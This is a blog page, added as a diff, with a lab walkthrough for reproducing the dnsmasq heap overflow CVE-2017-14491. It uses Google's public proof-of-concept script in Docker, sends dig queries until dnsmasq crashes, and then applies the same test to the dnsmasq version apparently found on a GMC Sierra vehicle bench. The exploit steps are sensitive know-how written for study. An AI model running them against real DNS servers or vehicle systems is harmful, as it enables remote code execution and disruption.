@@ -1,0 +1,529 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic|Lobster Two:300,300italic,400,400italic,700,700italic|Amita:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-center-circle.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="It’s about an Heap Overflow exploit in dnsmasq before 2.78. I failed to reproduce this vulnerability 3 years ago. This time I modified the POC again, then tried to figure it out. I listed the detailed">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AUTO Dnsmasq 2.78">
+<meta property="og:url" content="http://example.com/06/30/2025/Dnsmasq%202.78/index.html">
+<meta property="og:site_name" content="Cybersecurity Learner">
+<meta property="og:description" content="It’s about an Heap Overflow exploit in dnsmasq before 2.78. I failed to reproduce this vulnerability 3 years ago. This time I modified the POC again, then tried to figure it out. I listed the detailed">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/container-ID.png">
+<meta property="og:image" content="http://example.com/images/CVE-2017-14491.png">
+<meta property="og:image" content="http://example.com/images/dnsmasq-start.png">
+<meta property="og:image" content="http://example.com/images/dnsmasq-crashes.png">
+<meta property="og:image" content="http://example.com/images/dnsmasq-output.png">
+<meta property="og:image" content="http://example.com/images/test-output.png">
+<meta property="article:published_time" content="2025-06-29T16:20:16.000Z">
+<meta property="article:modified_time" content="2025-06-29T17:09:12.879Z">
+<meta property="article:author" content="GL">
+<meta property="article:tag" content="Troubleshooting">
+<meta property="article:tag" content="Kali">
+<meta property="article:tag" content="CVE">
+<meta property="article:tag" content="Docker">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/container-ID.png">
+
+<link rel="canonical" href="http://example.com/06/30/2025/Dnsmasq%202.78/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>AUTO Dnsmasq 2.78 | Cybersecurity Learner</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Cybersecurity Learner</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/06/30/2025/Dnsmasq%202.78/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/105226503_p0_master1200.jpg">
+      <meta itemprop="name" content="GL">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Cybersecurity Learner">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          AUTO Dnsmasq 2.78
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 06-30-2025 00:20:16" itemprop="dateCreated datePublished" datetime="2025-06-30T00:20:16+08:00">06-30-2025</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index"><span itemprop="name">Kali</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="Views" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">Views: </span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>It’s about an Heap Overflow exploit in dnsmasq before 2.78. I failed to reproduce this vulnerability 3 years ago. This time I modified the POC again, then tried to figure it out. I listed the detailed steps below.</p>
+<h1 id="Installing-docker-and-apt-utils"><a href="#Installing-docker-and-apt-utils" class="headerlink" title="Installing docker and apt-utils"></a>Installing docker and apt-utils</h1><ol>
+<li>   Enter the command: <strong>sudo apt install apt-utils</strong></li>
+<li>   Restart the system</li>
+<li>   When the system reboots, open a terminal window</li>
+<li>   Enter the command <strong>sudo apt install -y docker.io</strong></li>
+<li>   Then, Enter the command <strong>sudo systemctl enable docker –now</strong></li>
+</ol>
+<hr>
+<h1 id="Configuring-The-POC"><a href="#Configuring-The-POC" class="headerlink" title="Configuring The POC"></a>Configuring The POC</h1><ol>
+<li>   Enter the command : <strong>git clone <a target="_blank" rel="noopener" href="https://github.com/google/security-research-pocs.git">https://github.com/google/security-research-pocs.git</a></strong></li>
+<li>   Then, Enter the command <strong>cd /security-research-pocs/vulnerabilities/dnsmasq/</strong></li>
+<li>   Replace the dockerfile in the directory with the one in appendix A. It has been modernized to run on the current stable distribution of Debian (Bullseye) </li>
+<li>   Run the command <strong>docker build -t dnsmasq</strong>.</li>
+<li>   Run the command: <strong>docker run –rm -t -i –name dnsmasq_test dnsmasq bash</strong></li>
+<li>   This brings up a new terminal: root@<containter_ID>. Take note of this string of characters (example highlighted below). The String of numbers after root is the container ID.<br><img src="/images/container-ID.png"></li>
+<li>   In the Terminal application, click on File&gt;New Tab</li>
+<li>   In this new tab enter the command:                    <strong>cd /security-research-pocs/vulnerabilities/dnsmasq/</strong></li>
+<li>   Then enter the command:                               <strong>docker cp CVE-2017-14491.py dnsmasq_test:/CVE-2017-14491.py</strong></li>
+<li>   With the POC script copied over, enter the following command in the terminal: <strong>docker exec -it <container_id> bash</strong></li>
+<li>   This should open up a second docker terminal.</li>
+<li>   There needs to be three terminals for the exploit, repeat the following steps:<br>a.    In the terminal application, click on <strong>File&gt;New Tab</strong><br>b.    In The new terminal enter the command:               <strong>cd /security-research-pocs/vulnerabilities/dnsmasq/</strong><br>c.    Finally, run the command:                            <strong>docker exec -it <container_id> bash</strong></li>
+</ol>
+<hr>
+<h1 id="Running-the-Exploit"><a href="#Running-the-Exploit" class="headerlink" title="Running the Exploit"></a>Running the Exploit</h1><ol>
+<li>   To start the malicious DNS server enter the following commands:<br>a.    <strong>python2 CVE-2017-14491.py 127.0.0.2 53</strong><br>b.    The output should look like this:<br><img src="/images/CVE-2017-14491.png"></li>
+<li>   In a different terminal, start dnsmasq by entering the following commands:<br>a.    <strong>cd src/</strong><br>b.    <strong>./dnsmasq -p 53535 –no-daemon –log-queries -S 127.0.0.2 –no-hosts –no-resolv</strong><br>c.    The output of this command should look like:<br><img src="/images/dnsmasq-start.png"></li>
+<li>   Finally in the third remaining terminal enter the following command to send requests to the bad server:<br>a.    <strong>dig @localhost -p 53535 -x 8.8.8.125 &gt; /dev/null</strong><br>b.    Repeat this step by pressing the up arrow and enter<br>c.    Do this until the dnsmasq tab outputs something like this:<br><img src="/images/dnsmasq-crashes.png"></li>
+<li>This collection of Z’s means that dnsmasq has crashed, which in theory would allow a threat actor to run remote code on via a buffer overflow. Google’s security team originally wrote this proof of concept on Debian Jessie Linux distribution. Unfortunately, Debian Jesse reached its end of life on June 30th 2020. To remedy this, a member of the group edited the dockerfile to update the packages and dependencies to run on modern Linux. To see if the dockerfile would run, this member rolled the DNS git repository back to 2.68. With the exploit proven, the next logical step would be to load the version of dnsmasq that is found on the GMC Sierra bench to see if it is also vulnerable. The steps are the same as the ones listed above but in a different directory. Going back to the home directory of the root user, a new directory was created: GMCTRUCKmasq. The Google POC github repository was then cloned to this directory. The same path was navigated, but instead of copying the dockerfile, the dockerfile itself was deleted. A new dockerfile was created using the command “nano Dockerfile” and the contents of the version 2.68 file were copied over. The only difference between the version 2.68 dockerfile and the version 2.5.2 dockerfile is the content ID. Git repositories allow the user to roll back a repository to an earlier version of the software using the command git Checkout. This was beneficial because although the GMC is running a vulnerable version of dnsmasq, the current repository hosted at <a target="_blank" rel="noopener" href="http://thekelleys.org.uk/dnsmasq.git">http://thekelleys.org.uk/dnsmasq.git</a> has since patched this vulnerability. For the convenience of researchers attempting to recreate the steps of this experiment, a version of the dockerfile made for version 2.52 has been added below the dockerfile for version 2.68. From this point forward, the exact same steps were taken to attempt the exploit on version 2.52. After setting everything up per the instructions above, The first thing to check was that dnsmasq was running the intended version. executing ./dnsmasq -p 53535 –no-daemon –log-queries -S 127.0.0.2 –no-hosts –no-resolv shows the following output:<br><img src="/images/dnsmasq-output.png"></li>
+<li>With the version of the car ensured, the next step was to send dig commands to see if it was possible to crash the dnsmasq. The result of this test was as follows:<br><img src="/images/test-output.png"></li>
+</ol>
+<hr>
+<h1 id="Appendix-A"><a href="#Appendix-A" class="headerlink" title="Appendix A"></a>Appendix A</h1><p>Appendix A – Dnsmasq Dockerfile Fix<br>Modified from the dockerfile located at: <a target="_blank" rel="noopener" href="https://github.com/google/security-research-pocs">https://github.com/google/security-research-pocs</a> (dnsmasq ver. 2.68 et. 2.52)<br><strong>Version 2.68:</strong><br>FROM debian</p>
+<p>RUN apt-get update<br>RUN apt-get install -y wget git make gnupg nano python2 dnsutils</p>
+<p>#Unfortunately, this key isn’t available over HTTPS.<br>RUN wget -O /tmp/llvm-snapshot.gpg.key <a target="_blank" rel="noopener" href="https://apt.llvm.org/llvm-snapshot.gpg.key">https://apt.llvm.org/llvm-snapshot.gpg.key</a><br>RUN apt-key add /tmp/llvm-snapshot.gpg.key<br>RUN bash -c ‘echo “deb <a target="_blank" rel="noopener" href="http://apt.llvm.org/bullseye/">http://apt.llvm.org/bullseye/</a> llvm-toolchain-bullseye-13 main” &gt;&gt; /etc/apt/sources.list’<br>RUN bash -c ‘echo “deb-src <a target="_blank" rel="noopener" href="http://apt.llvm.org/bullseye/">http://apt.llvm.org/bullseye/</a> llvm-toolchain-bullseye-13 main” &gt;&gt; /etc/apt/sources.list’<br>RUN apt-get update<br>RUN apt-get install -y libllvm-13-ocaml-dev libllvm13 llvm-13 llvm-13-dev llvm-13-doc llvm-13-examples llvm-13-runtime clang-13 clang-tools-13 clang-13-doc libclang-common-13-dev libclang-13-dev libclang1-13 clang-format-13 python3-clang-13 clangd-13 clang-tidy-13 libfuzzer-13-dev lldb-13 lld-13 libclc-13-dev libfuzzer-13-dev libc++-13-dev libc++abi-13-dev</p>
+<p>ENV CFLAGS=”-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1”<br>ENV CXXFLAGS=”-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1”<br>ENV LDFLAGS=”-g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound”<br>ENV CC=”/usr/bin/clang-13”<br>ENV CXX=”/usr/bin/clang++-13”<br>ENV ASAN_OPTIONS=”exitcode=1,handle_segv=1,detect_leaks=1,leak_check_at_exit=1,allocator_may_return_null=1,detect_odr_violation=0”<br>ENV ASAN_SYMBOLIZER_PATH=”/usr/lib/llvm-13/bin/llvm-symbolizer”</p>
+<p>RUN bash -c ‘echo “export CFLAGS=&quot;${CFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXXFLAGS=&quot;${CXXFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export LDFLAGS=&quot;${LDFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CC=&quot;${CC}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXX=&quot;${CXX}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXXFLAGS=&quot;${CXXFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export ASAN_OPTIONS=&quot;${ASAN_OPTIONS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export ASAN_SYMBOLIZER_PATH=&quot;${ASAN_SYMBOLIZER_PATH}&quot;“ &gt;&gt; /root/.bashrc’</p>
+<p>WORKDIR /test<br>RUN git clone git://thekelleys.org.uk/dnsmasq.git<br>WORKDIR /test/dnsmasq<br>#switch to 2.6.8<br>RUN git checkout 56ad6c9be1b48791edfb140f87c3738dd723d116<br>#Patch Makefile so we can compile with ASAN<br>RUN sed -i’’ ‘s/LDFLAGS       =/LDFLAGS       ?=/‘ Makefile<br>RUN sed -i’’ ‘s/CFLAGS        =/CFLAGS        ?=/‘ Makefile<br>RUN make</p>
+<p>#Only the last ENTRYPOINT or CMD is honored, so this can be overridden.<br>ENTRYPOINT /bin/bash</p>
+<p><strong>Version 2.5.2</strong><br>FROM debian</p>
+<p>RUN apt-get update<br>RUN apt-get install -y wget git make gnupg nano python2 dnsutils</p>
+<p>#Unfortunately, this key isn’t available over HTTPS.<br>RUN wget -O /tmp/llvm-snapshot.gpg.key <a target="_blank" rel="noopener" href="https://apt.llvm.org/llvm-snapshot.gpg.key">https://apt.llvm.org/llvm-snapshot.gpg.key</a><br>RUN apt-key add /tmp/llvm-snapshot.gpg.key<br>RUN bash -c ‘echo “deb <a target="_blank" rel="noopener" href="http://apt.llvm.org/bullseye/">http://apt.llvm.org/bullseye/</a> llvm-toolchain-bullseye-13 main” &gt;&gt; /etc/apt/sources.list’<br>RUN bash -c ‘echo “deb-src <a target="_blank" rel="noopener" href="http://apt.llvm.org/bullseye/">http://apt.llvm.org/bullseye/</a> llvm-toolchain-bullseye-13 main” &gt;&gt; /etc/apt/sources.list’<br>RUN apt-get update<br>RUN apt-get install -y libllvm-13-ocaml-dev libllvm13 llvm-13 llvm-13-dev llvm-13-doc llvm-13-examples llvm-13-runtime clang-13 clang-tools-13 clang-13-doc libclang-common-13-dev libclang-13-dev libclang1-13 clang-format-13 python3-clang-13 clangd-13 clang-tidy-13 libfuzzer-13-dev lldb-13 lld-13 libclc-13-dev libfuzzer-13-dev libc++-13-dev libc++abi-13-dev</p>
+<p>ENV CFLAGS=”-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1”<br>ENV CXXFLAGS=”-O1 -g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound -fno-sanitize-recover=all -fno-omit-frame-pointer -DFUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION=1”<br>ENV LDFLAGS=”-g -fsanitize=address,bool,float-cast-overflow,integer-divide-by-zero,return,returns-nonnull-attribute,shift-exponent,signed-integer-overflow,unreachable,vla-bound”<br>ENV CC=”/usr/bin/clang-13”<br>ENV CXX=”/usr/bin/clang++-13”<br>ENV ASAN_OPTIONS=”exitcode=1,handle_segv=1,detect_leaks=1,leak_check_at_exit=1,allocator_may_return_null=1,detect_odr_violation=0”<br>ENV ASAN_SYMBOLIZER_PATH=”/usr/lib/llvm-13/bin/llvm-symbolizer”</p>
+<p>RUN bash -c ‘echo “export CFLAGS=&quot;${CFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXXFLAGS=&quot;${CXXFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export LDFLAGS=&quot;${LDFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CC=&quot;${CC}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXX=&quot;${CXX}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export CXXFLAGS=&quot;${CXXFLAGS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export ASAN_OPTIONS=&quot;${ASAN_OPTIONS}&quot;“ &gt;&gt; /root/.bashrc’<br>RUN bash -c ‘echo “export ASAN_SYMBOLIZER_PATH=&quot;${ASAN_SYMBOLIZER_PATH}&quot;“ &gt;&gt; /root/.bashrc’</p>
+<p>WORKDIR /test<br>RUN git clone git://thekelleys.org.uk/dnsmasq.git<br>WORKDIR /test/dnsmasq<br>#switch to 2.52<br>RUN git checkout 316e2730acfc439c6bb12beb7c286daffb3cac4e<br>#Patch Makefile so we can compile with ASAN<br>RUN sed -i’’ ‘s/LDFLAGS       =/LDFLAGS       ?=/‘ Makefile<br>RUN sed -i’’ ‘s/CFLAGS        =/CFLAGS        ?=/‘ Makefile<br>RUN make</p>
+<p>#Only the last ENTRYPOINT or CMD is honored, so this can be overridden.<br>ENTRYPOINT /bin/bash</p>
+<hr>
+<h1 id="Acknowledgments"><a href="#Acknowledgments" class="headerlink" title="Acknowledgments"></a>Acknowledgments</h1><h2 id="Thanks-for-the-efforts-from-all-of-my-American-group-members"><a href="#Thanks-for-the-efforts-from-all-of-my-American-group-members" class="headerlink" title="Thanks for the efforts from all of my American group members."></a>Thanks for the efforts from all of my American group members.</h2><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h1><p>Google.(2021, March 12). security-research-pocs. Retrieved from GitHub : <a target="_blank" rel="noopener" href="https://github.com/google/security-research-pocs">https://github.com/google/security-research-pocs</a> </p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Troubleshooting/" rel="tag"># Troubleshooting</a>
+              <a href="/tags/Kali/" rel="tag"># Kali</a>
+              <a href="/tags/CVE/" rel="tag"># CVE</a>
+              <a href="/tags/Docker/" rel="tag"># Docker</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/07/19/2024/Armitage%20Usage/" rel="prev" title="How to use Armitage">
+      <i class="fa fa-chevron-left"></i> How to use Armitage
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Installing-docker-and-apt-utils"><span class="nav-number">1.</span> <span class="nav-text">Installing docker and apt-utils</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Configuring-The-POC"><span class="nav-number">2.</span> <span class="nav-text">Configuring The POC</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Running-the-Exploit"><span class="nav-number">3.</span> <span class="nav-text">Running the Exploit</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Appendix-A"><span class="nav-number">4.</span> <span class="nav-text">Appendix A</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Acknowledgments"><span class="nav-number">5.</span> <span class="nav-text">Acknowledgments</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Thanks-for-the-efforts-from-all-of-my-American-group-members"><span class="nav-number">5.1.</span> <span class="nav-text">Thanks for the efforts from all of my American group members.</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Reference"><span class="nav-number">6.</span> <span class="nav-text">Reference:</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="GL"
+      src="/images/105226503_p0_master1200.jpg">
+  <p class="site-author-name" itemprop="name">GL</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">14</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">GL</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
